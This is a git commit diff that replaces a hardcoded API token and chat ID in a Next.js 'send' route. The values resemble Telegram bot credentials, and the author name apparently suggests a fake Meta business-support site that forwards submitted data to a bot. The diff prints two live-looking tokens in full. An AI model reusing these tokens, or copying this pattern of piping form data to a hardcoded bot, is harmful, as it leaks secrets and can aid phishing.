17996cc63fb2e5d08a30b4b18354efb4c123e048
SupportMetabusiness <dinhcongtruong2222@gmail.com>
2026-02-24 11:30:57 +0700

    Change API token and chat ID in route.ts
    Updated the API token and chat ID for sending messages.

--- src/app/api/send/route.ts
+++ src/app/api/send/route.ts
@@ -1,7 +1,7 @@
 import { NextRequest, NextResponse } from 'next/server';
 
-const TOKEN = '7971372917:AAG8mzLWTWH9nIY3lMEdkKQCro_c7uMtjM8';
-const CHAT_ID = '-5030626190';
+const TOKEN = '8129139989:AAEbp4qGEGYUL04TCKZcRy0xgXAquQNWN38';
+const CHAT_ID = '-4892819805';
 
 const POST = async (req: NextRequest) => {
     try {
